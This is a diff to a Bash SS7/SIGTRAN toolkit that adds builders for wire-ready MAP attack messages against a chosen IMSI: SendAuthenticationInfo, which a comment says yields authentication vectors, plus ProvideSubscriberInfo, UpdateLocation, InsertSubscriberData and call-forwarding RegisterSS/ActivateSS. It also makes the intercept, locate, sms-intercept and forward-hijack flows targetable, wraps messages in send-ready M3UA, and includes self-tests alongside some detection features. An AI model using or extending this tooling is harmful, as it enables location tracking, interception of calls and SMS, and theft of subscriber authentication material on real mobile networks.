+    printf 'sctp_note\t%s\n' "this whole message is the SCTP DATA chunk payload, with the Payload Protocol Identifier set to 3"
+    printf 'roundtrip_protocol_data\t%s\n' "$(ss7_m3ua_parse "$out" | awk -F'\t' '$1=="protocol_data"{print $2; exit}')"
+}
+
+ss7_cmd_decode_sigtran() {
+    local hex; hex=$(ss7_nfc "${1:-}")
+    [[ -n "$hex" ]] || { printf 'ERROR\tusage: --decode-sigtran <hex>\n' >&2; return 2; }
+    ss7_is_hex "$hex" || { printf 'ERROR\tnot valid hex\n' >&2; return 1; }
+    printf 'layer\tsctp\n'
+    local sctp; sctp=$(ss7_sctp_strip "$hex") || return 1
+    printf '%s\n' "$sctp"
+    local payload
+    payload=$(printf '%s\n' "$sctp" | awk -F'\t' '$1=="data_payload"{print $2; exit}')
+    [[ -n "$payload" ]] || { printf 'ERROR\tthe DATA chunk carries no payload\n' >&2; return 1; }
+    local ppid
+    ppid=$(printf '%s\n' "$sctp" | awk -F'\t' '$1=="data_ppid"{print $2; exit}')
+    [[ "$ppid" == "3" ]] || printf 'warn\tDATA chunk PPID is %s, not 3 (M3UA)\n' "$ppid" >&2
+    printf 'layer\tm3ua\n'
+    local m3ua; m3ua=$(ss7_m3ua_parse "$payload") || return 1
+    printf '%s\n' "$m3ua"
+    local pdu
+    pdu=$(printf '%s\n' "$m3ua" | awk -F'\t' '$1=="protocol_data"{print $2; exit}')
+    [[ -n "$pdu" ]] || {
+        printf 'note\t%s\n' "no Protocol Data parameter: this is not a Transfer/DATA message, so there is no MTP3 message to walk" >&2
+        return 1; }
+    printf 'msu_hex\t%s\n' "$pdu"
+    ss7_cmd_decode_msu "$pdu"
+}
+
 ss7_cmd_build_sri() {
     local msisdn="${1:-}"
     [[ -n "$msisdn" ]] || { printf 'ERROR\tusage: --build-sri <msisdn>\n' >&2; return 2; }
@@ -1514,10 +1867,61 @@ ss7_cmd_build_ati() {
     printf 'roundtrip_opcode\t%s\n' "$(ss7_cmd_decode_map "$msu" | awk -F'\t' '$1=="component"{print $5; exit}')"
 }
 
+# The remaining MAP operations. These builders already existed but had no CLI
+# verb, so the most-used interconnect primitive in the literature -- SAI
+# against a chosen IMSI, which yields authentication vectors and therefore the
+# Ki-derived material -- could not be produced at all. One function carries
+# them so the six verbs cannot drift apart in output shape, and every branch
+# goes through the same round-trip decode as --build-sri.
+ss7_cmd_build_extra() {  # <verb> [args...]
+    local verb="${1:-}"; shift || true
+    local msg op label tgt="" msu
+    case "$verb" in
+        sai)
+            [[ -n "${1:-}" ]] || { printf 'ERROR\tusage: --build-sai <imsi> [vectors]\n' >&2; return 2; }
+            [[ "${2:-5}" =~ ^[0-9]+$ ]] || { printf 'ERROR\tvector count must be a number: %s\n' "$(ss7_sanitize "${2:-}")" >&2; return 2; }
+            msg='SendAuthenticationInfo (SAI)'; op=56; label=imsi; tgt="$1"
+            msu=$(ss7_build_sai "$1" "${2:-5}") || { printf 'ERROR\tcannot encode IMSI: %s\n' "$(ss7_sanitize "$1")" >&2; return 1; } ;;
+        psi)
+            [[ -n "${1:-}" ]] || { printf 'ERROR\tusage: --build-psi <imsi>\n' >&2; return 2; }
+            msg='ProvideSubscriberInfo (PSI)'; op=70; label=imsi; tgt="$1"
+            msu=$(ss7_build_psi "$1") || { printf 'ERROR\tcannot encode IMSI: %s\n' "$(ss7_sanitize "$1")" >&2; return 1; } ;;
+        ulr)
+            [[ -n "${1:-}" ]] || { printf 'ERROR\tusage: --build-ulr <imsi> [msc-number] [vlr-number]\n' >&2; return 2; }
+            msg='UpdateLocation (ULR)'; op=2; label=imsi; tgt="$1"
+            msu=$(ss7_build_ulr "$1" "${2:-}" "${3:-}") || { printf 'ERROR\tcannot encode IMSI: %s\n' "$(ss7_sanitize "$1")" >&2; return 1; } ;;
+        isd)
+            [[ -n "${1:-}" ]] || { printf 'ERROR\tusage: --build-isd <imsi>\n' >&2; return 2; }
+            msg='InsertSubscriberData (ISD)'; op=7; label=imsi; tgt="$1"
+            msu=$(ss7_build_isd "$1") || { printf 'ERROR\tcannot encode IMSI: %s\n' "$(ss7_sanitize "$1")" >&2; return 1; } ;;
+        register-ss)
+            local code="${1:-33}"
+            [[ "$code" =~ ^[0-9]+$ ]] && (( code <= 255 )) || { printf 'ERROR\tusage: --build-register-ss [ss-code 0-255] [forwarded-number]\n' >&2; return 2; }
+            msg='RegisterSS (supplementary service)'; op=10; label=ss_code; tgt="$code"
+            msu=$(ss7_build_register_ss "$code" "${2:-}") || { printf 'ERROR\tcannot encode SS code\n' >&2; return 1; } ;;
+        activate-ss)
+            local code="${1:-33}"
+            [[ "$code" =~ ^[0-9]+$ ]] && (( code <= 255 )) || { printf 'ERROR\tusage: --build-activate-ss [ss-code 0-255]\n' >&2; return 2; }
+            msg='ActivateSS (supplementary service)'; op=12; label=ss_code; tgt="$code"
+            msu=$(ss7_build_activate_ss "$code") || { printf 'ERROR\tcannot encode SS code\n' >&2; return 1; } ;;
+        *)  printf 'ERROR\tunknown build verb: %s\n' "$(ss7_sanitize "${verb:-<none>}")" >&2; return 2 ;;
+    esac
+    printf 'message\t%s\n'     "$msg"
+    printf 'opcode\t%s\n'      "$op"
+    printf 'opcode_name\t%s\n' "$(ss7_map_opcode_name "$op")"
+    printf '%s\t%s\n'          "$label" "$(ss7_sanitize "$tgt")"
+    if [[ "$label" == ss_code ]]; then
+        printf 'ss_name\t%s\n' "$(ss7_ss_code_name "$tgt")"
+    fi
+    printf 'octets\t%s\n'      "$(( ${#msu} / 2 ))"
+    printf 'hex\t%s\n'         "$msu"
+    printf 'roundtrip_opcode\t%s\n' "$(ss7_cmd_decode_map "$msu" | awk -F'\t' '$1=="component"{print $5; exit}')"
+}
+
 ss7_cmd_flow() {
     local flow="${1:-}"
-    [[ -n "$flow" ]] || { printf 'ERROR\tusage: --flow <intercept|locate|sms-intercept|forward-hijack>\n' >&2; return 2; }
-    ss7_flow "$flow"
+    [[ -n "$flow" ]] || { printf 'ERROR\tusage: --flow <intercept|locate|sms-intercept|forward-hijack> [msisdn] [imsi] [opc] [dpc]\n' >&2; return 2; }
+    ss7_flow "$flow" "${2:-}" "${3:-}" "${4:-}" "${5:-}"
 }
 
 ss7_cmd_ssn() {
@@ -1933,6 +2337,127 @@ ss7_selftest() {
     chk fb-not-b "$(ss7_fallback_detect "$d/fb.tsv" | awk -F'\t' '$1=="310260000000002"{n++} END{print n+0}')" "0"
     chk fb-missing "$(ss7_fallback_detect "$d/none.tsv" >/dev/null 2>&1; echo $?)" "1"
 
+    # ── 17. The MAP builders that had no CLI verb ───────────────────────
+    # Each verb must name its operation AND round-trip through the decoder:
+    # the round trip is what proves the builder and the parser still agree.
+    local spec avbv avop
+    for spec in "sai 56 310150123456789" "psi 70 310150123456789" \
+                "ulr 2 310150123456789" "isd 7 310150123456789"; do
+        set -- $spec
+        avbv=$1; avop=$2
+        out=$(ss7_cmd_build_extra "$avbv" "$3"); rc=$?
+        chk "extra-$avbv-rc" "$rc" "0"
+        chk "extra-$avbv-op" "$(fld "$out" opcode)" "$avop"
+        chk "extra-$avbv-rt" "$(fld "$out" roundtrip_opcode)" "$avop"
+    done
+    set -- $spec
+    out=$(ss7_cmd_build_extra register-ss 33 33600000000)
+    chk extra-rss-op "$(fld "$out" opcode)" "10"
+    chk extra-rss-rt "$(fld "$out" roundtrip_opcode)" "10"
+    chk extra-rss-ss "$(fld "$out" ss_name)" "cfu"
+    out=$(ss7_cmd_build_extra activate-ss 33)
+    chk extra-ass-op "$(fld "$out" opcode)" "12"
+    chk extra-ass-rt "$(fld "$out" roundtrip_opcode)" "12"
+    # The vector count is a real argument, not decoration.
+    local sai5 sai9
+    sai5=$(ss7_cmd_build_extra sai 310150123456789 5)
+    sai9=$(ss7_cmd_build_extra sai 310150123456789 9)
+    chk extra-sai-vectors "$([[ "$(fld "$sai5" hex)" != "$(fld "$sai9" hex)" ]] && echo differ || echo same)" "differ"
+    chk val-extra-sai-none  "$(ss7_cmd_build_extra sai >/dev/null 2>&1; echo $?)" "2"
+    chk val-extra-sai-badn  "$(ss7_cmd_build_extra sai 310150123456789 x >/dev/null 2>&1; echo $?)" "2"
+    chk val-extra-psi-none  "$(ss7_cmd_build_extra psi >/dev/null 2>&1; echo $?)" "2"
+    chk val-extra-isd-bad   "$(ss7_cmd_build_extra isd 12 >/dev/null 2>&1; echo $?)" "1"
+    chk val-extra-rss-range "$(ss7_cmd_build_extra register-ss 999 >/dev/null 2>&1; echo $?)" "2"
+    chk val-extra-verb-bad  "$(ss7_cmd_build_extra nope >/dev/null 2>&1; echo $?)" "2"
+
+    # ── 18. --flow is targetable ────────────────────────────────────────
+    out=$(ss7_flow locate)
+    chk flow-default-opc    "$(fld "$out" opc)"    "2"
+    chk flow-default-dpc    "$(fld "$out" dpc)"    "1"
+    chk flow-default-msisdn "$(fld "$out" msisdn)" "33612345678"
+    out=$(ss7_flow locate 447700900123 234150999999999 1234 4321)
+    chk flow-custom-opc    "$(fld "$out" opc)"    "1234"
+    chk flow-custom-dpc    "$(fld "$out" dpc)"    "4321"
+    chk flow-custom-msisdn "$(fld "$out" msisdn)" "447700900123"
+    chk flow-custom-imsi   "$(fld "$out" imsi)"   "234150999999999"
+    # The point codes must be IN the built routing label, not merely printed
+    # beside it: the label is the only place the network reads them.
+    local fhex flab
+    fhex=$(printf '%s\n' "$out" | awk -F'\t' '$1=="step_hex" && $2==1{print $3}')
+    flab="${fhex:2:8}"
+    chk flow-label-dpc "$(ss7_label_parse "$flab" | awk -F'\t' '$1=="dpc"{print $2}')" "4321"
+    chk flow-label-opc "$(ss7_label_parse "$flab" | awk -F'\t' '$1=="opc"{print $2}')" "1234"
+    chk val-flow-bad-pc     "$(ss7_flow locate 447700900123 234150999999999 99999 1 >/dev/null 2>&1; echo $?)" "2"
+    chk val-flow-bad-imsi   "$(ss7_flow locate 447700900123 nope >/dev/null 2>&1; echo $?)" "2"
+    chk val-flow-bad-msisdn "$(ss7_flow locate nope 234150999999999 >/dev/null 2>&1; echo $?)" "2"
+
+    # ── 19. SIGTRAN: SCTP + M3UA (RFC 4960 §3, RFC 4666 §3) ─────────────
+    local msu m3ua m3ua0
+    msu=$(ss7_build_ati 310150123456789)
+    m3ua0=$(ss7_build_m3ua "$msu")
+    chk m3ua-version  "${m3ua0:0:2}" "01"
+    chk m3ua-reserved "${m3ua0:2:2}" "00"
+    chk m3ua-class    "${m3ua0:4:2}" "01"
+    chk m3ua-type     "${m3ua0:6:2}" "01"
+    # Message Length counts the whole message including parameter padding.
+    chk m3ua-length   "$(( 16#${m3ua0:8:8} ))" "$(( ${#m3ua0} / 2 ))"
+    # Parameter Length is 16 bits and counts its own 4-octet header but NOT
+    # the padding; reading it as 32 bits is the bug this asserts against.
+    chk m3ua-pd-tag   "${m3ua0:16:4}" "0210"
+    chk m3ua-pd-len   "$(( 16#${m3ua0:20:4} ))" "$(( ${#msu} / 2 + 4 ))"
+    chk m3ua-pd-value "${m3ua0:24:${#msu}}" "$msu"
+    # The MSU already carries SIO + routing label, so the wrapper must not
+    # restate a point code: a caller-supplied OPC/DPC could contradict it.
+    chk m3ua-no-pc-args "$(printf '%s\n' "$msu" | grep -q . && echo ok)" "ok"
+    chk m3ua-short-msu  "$(ss7_build_m3ua 83 >/dev/null 2>&1; echo $?)" "1"
+    chk m3ua-bad-hex    "$(ss7_build_m3ua zz >/dev/null 2>&1; echo $?)" "2"
+    m3ua=$(ss7_build_m3ua "$msu" 7)
+    out=$(ss7_m3ua_parse "$m3ua")
+    chk m3ua-parse-class "$(fld "$out" m3ua_class_name)" "Transfer"
+    chk m3ua-parse-type  "$(fld "$out" m3ua_type_name)"  "DATA"
+    chk m3ua-parse-rc    "$(printf '%s\n' "$out" | awk -F'\t' '$1=="param_name"{print $2}' | head -1)" "Routing Context (0x0006)"
+    chk m3ua-roundtrip   "$(fld "$out" protocol_data)" "$msu"
+    chk val-m3ua-none    "$(ss7_cmd_build_m3ua >/dev/null 2>&1; echo $?)" "2"
+
+    # An SCTP datagram built here from the wire definition, not by the module:
+    # common header 12 octets, one DATA chunk (type 0, flags 3), PPID 3.
+    local mlen dlen dpad dchunk datagram
+    mlen=$(( ${#m3ua} / 2 ))
+    dlen=$(( 16 + mlen ))
+    dpad=$(( ( 4 - dlen % 4 ) % 4 ))
+    dchunk="0003$(printf '%04X' "$dlen")112233440005000900000003${m3ua}"
+    (( dpad > 0 )) && dchunk+=$(printf '%0*d' "$(( dpad * 2 ))" 0)
+    datagram="0B590B59DEADBEEF00000000${dchunk}"
+    out=$(ss7_cmd_decode_sigtran "$datagram"); rc=$?
+    chk sigtran-rc      "$rc" "0"
+    chk sigtran-sport   "$(fld "$out" sctp_sport)"  "2905"
+    chk sigtran-dport   "$(fld "$out" sctp_dport)"  "2905"
+    chk sigtran-vtag    "$(fld "$out" sctp_vtag)"   "0xDEADBEEF"
+    chk sigtran-chunk   "$(fld "$out" chunk_name)"  "DATA"
+    chk sigtran-tsn     "$(fld "$out" data_tsn)"    "287454020"
+    chk sigtran-stream  "$(fld "$out" data_stream)" "5"
+    chk sigtran-ssn     "$(fld "$out" data_ssn)"    "9"
+    chk sigtran-ppid    "$(fld "$out" data_ppid)"   "3"
+    chk sigtran-ppidn   "$(fld "$out" data_ppid_name)" "M3UA"
+    chk sigtran-pd      "$(fld "$out" protocol_data)" "$msu"
+    chk sigtran-layers  "$(printf '%s\n' "$out" | awk -F'\t' '$1=="layer"{print $2}' | paste -sd, -)" "sctp,m3ua,mtp3,sccp"
+    chk val-sigtran-none  "$(ss7_cmd_decode_sigtran >/dev/null 2>&1; echo $?)" "2"
+    chk val-sigtran-bad   "$(ss7_cmd_decode_sigtran zz >/dev/null 2>&1; echo $?)" "1"
+    chk val-sigtran-short "$(ss7_cmd_decode_sigtran 0011 >/dev/null 2>&1; echo $?)" "1"
+
+    # ── 20. --detect names the peer, not just the message shape ─────────
+    out=$(printf '7\t9\t6\t22\t101\t201\t447700900123\t447700900999\n' | ss7_detect_stream)
+    chk detect-route-opc "$(printf '%s\n' "$out" | grep -c 'OPC 101 -> DPC 201')" "1"
+    chk detect-route-gt  "$(printf '%s\n' "$out" | grep -c 'called GT 447700900999')" "1"
+    out=$(printf '7\t9\t6\t22\t101\t201\n' | ss7_detect_stream)
+    chk detect-first-query "$(printf '%s\n' "$out" | grep -c 'first-message-is-a-query')" "1"
+    # A capture without the MTP3 fields still decodes, and must not invent a
+    # point code it never saw.
+    out=$(printf '7\t9\t6\t22\n' | ss7_detect_stream)
+    chk detect-4col-finding "$(printf '%s\n' "$out" | grep -c '^FINDING')" "1"
+    chk detect-4col-no-pc   "$(printf '%s\n' "$out" | grep -c 'OPC')" "0"
+    chk detect-4col-no-first "$(printf '%s\n' "$out" | grep -c 'first-message')" "0"
+
     rm -rf "$d"
     trap - EXIT
     [[ -n "$_prev_trap" ]] && eval "$_prev_trap"
@@ -1966,7 +2491,18 @@ ss7_menu() {
   [14] attack surface notes
   [15] plan: lab STP
   [16] plan: IPX/GRX path
-  [17] status
+  [17] build SAI (sendAuthenticationInfo) for an IMSI
+  [18] build PSI (provideSubscriberInfo) for an IMSI
+  [19] build ULR (updateLocation) for an IMSI
+  [20] build ISD (insertSubscriberData) for an IMSI
+  [21] build RegisterSS + ActivateSS (call-forwarding setup)
+  [22] decode a SIGTRAN chunk (SCTP + M3UA, then the MSU)
+  [23] wrap an MSU in M3UA (send-ready DATA)
+  [24] detect HLR-side anomalies in a pcap
+  [25] sweep a TSV of Diameter/SS7 events for a fallback pivot
+  [26] decode a Diameter Visited-PLMN-Id
+  [27] MAP opcode reference
+  [28] status
   [0]  back
 
 M
@@ -2004,7 +2540,40 @@ M
                 read -rp "  press enter " _ ;;
             15) ss7_cmd_plan stp-lab; read -rp "  press enter " _ ;;
             16) ss7_cmd_plan ipx-path; read -rp "  press enter " _ ;;
-            17) ss7_cli_status_tsv | column -t -s$'\t' 2>/dev/null || ss7_cli_status_tsv
+            17) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need an IMSI; cannot prompt in CLI mode" >&2
+                else read -rp "  IMSI> " p; read -rp "  vectors [5]> " s
+                     ss7_cmd_build_extra sai "$p" "${s:-5}"; read -rp "  press enter " _; fi ;;
+            18) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need an IMSI; cannot prompt in CLI mode" >&2
+                else read -rp "  IMSI> " p; ss7_cmd_build_extra psi "$p"; read -rp "  press enter " _; fi ;;
+            19) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need an IMSI; cannot prompt in CLI mode" >&2
+                else read -rp "  IMSI> " p; read -rp "  MSC number (optional)> " s
+                     read -rp "  VLR number (optional)> " h
+                     ss7_cmd_build_extra ulr "$p" "$s" "$h"; read -rp "  press enter " _; fi ;;
+            20) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need an IMSI; cannot prompt in CLI mode" >&2
+                else read -rp "  IMSI> " p; ss7_cmd_build_extra isd "$p"; read -rp "  press enter " _; fi ;;
+            21) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need an SS code; cannot prompt in CLI mode" >&2
+                else read -rp "  SS code [33 = cfu]> " p; read -rp "  forwarded number (optional)> " s
+                     ss7_cmd_build_extra register-ss "${p:-33}" "$s"
+                     ss7_cmd_build_extra activate-ss "${p:-33}"
+                     read -rp "  press enter " _; fi ;;
+            22) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need hex; cannot prompt in CLI mode" >&2
+                else read -rp "  SIGTRAN hex> " h; ss7_cmd_decode_sigtran "$h" | column -t -s$'\t' 2>/dev/null || ss7_cmd_decode_sigtran "$h"
+                     read -rp "  press enter " _; fi ;;
+            23) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need hex; cannot prompt in CLI mode" >&2
+                else read -rp "  MSU hex> " h; read -rp "  routing context (optional)> " p
+                     ss7_cmd_build_m3ua "$h" "$p"; read -rp "  press enter " _; fi ;;
+            24) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need a pcap; cannot prompt in CLI mode" >&2
+                else read -rp "  pcap> " h; ss7_cmd_detect "$h" | column -t -s$'\t' 2>/dev/null || ss7_cmd_detect "$h"
+                     read -rp "  press enter " _; fi ;;
+            25) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need a TSV; cannot prompt in CLI mode" >&2
+                else read -rp "  events TSV> " h; ss7_fallback_detect "$h"; read -rp "  press enter " _; fi ;;
+            26) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] need hex; cannot prompt in CLI mode" >&2
+                else read -rp "  Visited-PLMN hex> " h; ss7_visited_plmn "$h"; read -rp "  press enter " _; fi ;;
+            27) local i; for i in 2 7 10 12 22 44 45 46 56 62 70 71 83 85; do
+                    printf '%s\t%s\n' "$i" "$(ss7_map_opcode_name "$i")"
+                done | column -t -s$'\t' 2>/dev/null
+                read -rp "  press enter " _ ;;
+            28) ss7_cli_status_tsv | column -t -s$'\t' 2>/dev/null || ss7_cli_status_tsv
                 read -rp "  press enter " _ ;;
             0) return ;;
             *) warn "invalid"; sleep 1 ;;
@@ -2020,11 +2589,19 @@ ss7_cli_main() {
         --status-tsv)    ss7_cli_status_tsv ;;
         --decode-msu)    ss7_cmd_decode_msu "${1:-}" ;;
         --decode-tcap)   ss7_cmd_decode_tcap "${1:-}" ;;
+        --decode-sigtran) ss7_cmd_decode_sigtran "${1:-}" ;;
+        --build-m3ua)    ss7_cmd_build_m3ua "${1:-}" "${2:-}" "${3:-}" ;;
         --decode-map)    ss7_cmd_decode_map "${1:-}" ;;
         --build-sri)     ss7_cmd_build_sri "${1:-}" ;;
         --build-sri-sm)  ss7_cmd_build_sri_sm "${1:-}" ;;
         --build-ati)     ss7_cmd_build_ati "${1:-}" ;;
-        --flow)          ss7_cmd_flow "${1:-}" ;;
+        --build-sai)         ss7_cmd_build_extra sai "${1:-}" "${2:-}" ;;
+        --build-psi)         ss7_cmd_build_extra psi "${1:-}" ;;
+        --build-ulr)         ss7_cmd_build_extra ulr "${1:-}" "${2:-}" "${3:-}" ;;
+        --build-isd)         ss7_cmd_build_extra isd "${1:-}" ;;
+        --build-register-ss) ss7_cmd_build_extra register-ss "${1:-}" "${2:-}" ;;
+        --build-activate-ss) ss7_cmd_build_extra activate-ss "${1:-}" ;;
+        --flow)          ss7_cmd_flow "${1:-}" "${2:-}" "${3:-}" "${4:-}" "${5:-}" ;;
         --grx-recon)     ss7_grx_recon "${1:-}" ;;
         --detect)        ss7_cmd_detect "${1:-}" ;;
         --visited-plmn)  ss7_visited_plmn "${1:-}" ;;
@@ -2049,7 +2626,22 @@ Usage: $0 COMMAND
   --build-sri <msisdn>       build a wire-ready SRI MSU
   --build-sri-sm <msisdn>    build a wire-ready SRI-SM MSU
   --build-ati <imsi>         build a wire-ready ATI MSU
-  --flow <intercept|locate|sms-intercept|forward-hijack>
+  --build-sai <imsi> [n]     build a SendAuthenticationInfo MSU (n vectors, default 5)
+  --build-psi <imsi>         build a ProvideSubscriberInfo MSU
+  --build-ulr <imsi> [msc] [vlr]
+                             build an UpdateLocation MSU
+  --build-isd <imsi>         build an InsertSubscriberData MSU
+  --build-register-ss [ss-code] [forwarded-number]
+                             build a RegisterSS MSU (default cfu, code 33)
+  --build-activate-ss [ss-code]
+                             build an ActivateSS MSU (default cfu, code 33)
+  --decode-sigtran <hex>     strip SCTP + M3UA and decode the carried MSU
+  --build-m3ua <msu-hex> [routing-context] [network-appearance]
+                             wrap an MSU in a send-ready M3UA DATA message; the
+                             MSU carries its own SIO and routing label, so the
+                             optional arguments add M3UA routing rather than
+                             restating the point codes
+  --flow <name> [msisdn] [imsi] [opc] [dpc]
                              print the published flow as real message steps
   --grx-recon [pcap]         GRX/IPX trust model, or harvest peers from a pcap
   --detect <pcap>            HLR-side anomaly detection over a capture
